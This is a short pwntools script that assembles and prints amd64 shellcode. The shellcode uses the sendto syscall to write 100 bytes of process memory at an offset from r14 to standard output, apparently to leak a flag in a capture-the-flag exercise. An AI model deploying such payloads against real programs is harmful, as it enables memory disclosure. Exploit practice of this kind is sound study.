from pwn import *

context.arch = 'amd64'
payload = asm('''
    mov rdi, 1
    add r14, 0x2c0
    mov rsi, r14
    mov rdx, 100
    xor r10, r10
    xor r8, r8
    xor r9, r9
    mov rax, 44
    syscall
''')

print(bytes(payload))